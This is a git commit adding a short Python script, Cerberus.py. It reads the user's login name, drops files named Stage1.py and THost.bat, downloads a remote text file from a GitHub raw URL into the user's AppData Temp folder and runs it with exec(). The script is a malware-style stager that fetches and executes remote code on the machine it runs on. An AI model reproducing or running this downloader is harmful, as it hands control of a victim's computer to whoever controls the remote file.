ab1e0d0819cdc0846f25590784cdaf95928aeab4
Param Kudle <136839842+paramkudle@users.noreply.github.com>
2024-07-02 16:09:04 +0530

    Create Cerberus.py

---
+++ Cerberus.py
@@ -0,0 +1,19 @@
+import os.path
+import urllib.request
+from bs4 import BeautifulSoup
+
+x = os.getlogin()
+
+file = open('THost.bat', 'a')
+file.close()
+
+path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
+
+
+if os.path.isfile(path) == False:
+    file = open('Stage1.py', 'a')
+    file.close()
+
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1Source.txt", path)
+
+exec(open(path).read())
